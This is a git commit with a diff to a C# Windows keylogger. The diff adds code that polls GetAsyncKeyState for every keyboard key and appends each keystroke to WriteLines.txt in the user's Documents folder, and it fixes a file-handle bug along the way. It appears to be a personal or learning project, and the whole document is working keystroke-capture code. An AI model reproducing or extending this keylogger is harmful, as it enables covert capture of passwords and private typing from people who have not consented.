d28295d0fa28651c1de42fa32af28307ce672f90
Luxury-Karma <108990098+Luxury-Karma@users.noreply.github.com>
2025-06-11 11:06:23 -0400

    solved problem
    so yea I forgot to close the file once open. This solve the problem that I could not access it and write in it.

--- keylogger/Program.cs
+++ keylogger/Program.cs
@@ -11,6 +11,7 @@ using System;
 using System.Runtime.InteropServices;
 using System.Threading;
 using System.IO;
+using System.Runtime.CompilerServices;
 
 class KeyLogger
 {
@@ -26,7 +27,7 @@ class KeyLogger
 
         try
         {
-            StreamWriter outputFile = new StreamWriter(Path.Combine(path, "WriteLines.txt"));
+            using (StreamWriter outputFile = new StreamWriter(Path.Combine(path, "WriteLines.txt"))) { } // create and close the file imediatly
             return true;
         }
         catch (Exception _)
@@ -39,6 +40,19 @@ class KeyLogger
 
     }
 
+    // Add a key to the file 
+    static void write_file(string key_pressed)
+    {
+        string path = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+
+        using (StreamWriter outputFile = new StreamWriter(Path.Combine(path, "WriteLines.txt"), true)) // append the new value to the existing file
+        {
+            outputFile.Write(key_pressed);
+        }
+
+        return;
+    }
+
     static void Main()
     {
 
@@ -49,14 +63,15 @@ class KeyLogger
         while (true)
         {
             Thread.Sleep(10); // it is in ms so we let 10 ms in between any key stroke, This could miss automated stroke 
-
+            
+            string all_key_pressed = "";
             /*
              * i = 8 because 0x01=left mouse, 0x02 =  right mouse, 0x03 = cancel 0x04 = Middle mouse
              * we stop at 255 or 0xFF because these are all of the key of the keyboard. [8,255] are the key on the keyboard 
              */
             for (int i = 8; i < 255; i++)
             {
-
+                
                 short state = GetAsyncKeyState(i); // win api to know the key state of a specific key.
                 bool is_down = (state & 0x8000) != 0; // Check if bit 15 is down
                 bool was_pressed = (state & 0x001) != 0; // check if the key was press since last call
@@ -64,8 +79,11 @@ class KeyLogger
                 if (was_pressed)
                 {
                     Console.WriteLine((ConsoleKey)i);
+                    ConsoleKey key = (ConsoleKey)i; // The enum of Console Key is use to find which key was used 
+                    write_file(key.ToString());
                 }
             }
+
         }
     }
 
